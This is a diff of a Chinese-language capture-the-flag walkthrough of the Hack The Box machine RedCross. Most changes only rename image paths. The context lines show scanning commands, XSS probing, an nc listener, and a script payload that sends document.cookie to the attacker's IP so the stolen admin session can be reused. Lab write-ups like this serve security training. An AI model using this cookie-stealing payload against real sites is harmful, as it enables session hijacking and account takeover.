@@ -28,7 +28,7 @@ nmap -sC -sV -p- -oA redcross 10.129.9.55 --open
 dirsearch -u  http://10.129.9.55 -x 403,404,400
 ```
 
-<figure><img src="../../.gitbook/assets/4 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/4 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 使用Wfuzz尝试扫描子域，发现有两个结果：
 
@@ -36,13 +36,13 @@ dirsearch -u  http://10.129.9.55 -x 403,404,400
 wfuzz -c -u https://intra.redcross.htb -H "Host:FUZZ.redcross.htb" -w subdomains-top1million-110000.txt --hc 404 -t 200 --hl
 ```
 
-<figure><img src="../../.gitbook/assets/5 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/5 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 将以上子域也添加到/hosts文件中，再访问admin这个子域就获得了一个管理登录界面，简单尝试几个弱口令均失败：
 
-<figure><img src="../../.gitbook/assets/6 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/6 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/7 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/7 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 找到的两个登录界面也没有查看到所使用的公开已知的软件信息，因此无法通过常规的搜寻公开已知漏洞进行利用。在当前没有任何有效凭证的情况下，尝试暴力破解无果。决定从头枚举，发现遗漏了对443端口的扫描：
 
@@ -56,20 +56,20 @@ dirbuster -u https://intra.redcross.htb:443 -l /usr/share/wordlists/dirbuster/di
 
 <figure><img src="../../.gitbook/assets/9 (28).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/10 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/10 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 花了大量的时间进行扫描，实在是没找到什么有用的东西和凭证，所以决定从已经枚举出的页面进行测试。因为其他几个都是登录页面，所以先从有输入框的contact页面开始进行XSS测试，先寻找XSS注入点。
 * 首先简单写个\<script>脚本标签，依次放入不同的输入框中进行POST提交，观察有无返回信息，以及返回信息的具体内容：
 
-<figure><img src="../../.gitbook/assets/11 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/11 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/12 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/12 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 当把\<script>脚本标签放入contact phone or email这个框中时，返回了已发送的提示，说明此时我们已找到了注入点：
 
-<figure><img src="../../.gitbook/assets/13 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/13 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/14 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/14 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 然后开始构建注入语句，先简单测试一下和本机是否通信：
 
@@ -80,9 +80,9 @@ dirbuster -u https://intra.redcross.htb:443 -l /usr/share/wordlists/dirbuster/di
 nc -lvnp 8888
 ```
 
-<figure><img src="../../.gitbook/assets/16 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/16 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/15 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/15 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 然后构建一个尝试获取有效的会话cookie的语句，当能获取到有效的cookie时，我们就能将该cookie放入自己的浏览器中，绕过原有的密码输入，伪装成该用户进行登录：
 
@@ -90,17 +90,17 @@ nc -lvnp 8888
 <strong>&#x3C;script>new Image().src="http://10.10.16.17:8888/test.php?c="+document.cookie;&#x3C;/script>
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/17 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/17 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/18.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/18 (1).png" alt=""><figcaption></figcaption></figure>
 
 ### GET SHELL
 
 * 此时已获取到了有效的PHPSESSIONID，并且后面的域是指向admin的，说明是admin这个页面的cookie，去admin页面登录。替换掉原有的PHPSESSIONID，然后刷新页面即可登录成功：
 
-<figure><img src="../../.gitbook/assets/19.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/19 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/20.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/20 (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/21.png" alt=""><figcaption></figcaption></figure>
 
